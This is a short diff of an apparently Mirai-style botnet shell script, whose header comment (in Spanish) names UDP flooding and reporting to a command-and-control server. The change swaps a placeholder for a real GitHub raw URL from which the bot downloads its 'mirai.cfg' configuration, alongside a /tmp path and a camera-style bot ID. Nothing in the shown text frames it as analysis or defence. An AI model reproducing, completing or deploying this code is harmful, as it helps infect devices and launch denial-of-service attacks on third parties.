@@ -5,7 +5,7 @@
 #  Canales: flood UDP + reporte MQTT/TCP al C2
 # ==============================================================
 
-MIRAI_URL="http://CHANGE/bot/mirai.cfg"
+MIRAI_URL="https://raw.githubusercontent.com/g2gjl2026-ops/mirai-cam/main/mirai.cfg"
 CFG="/tmp/mirai.cfg"
 ID="axis-b8a44fcd4447"
 
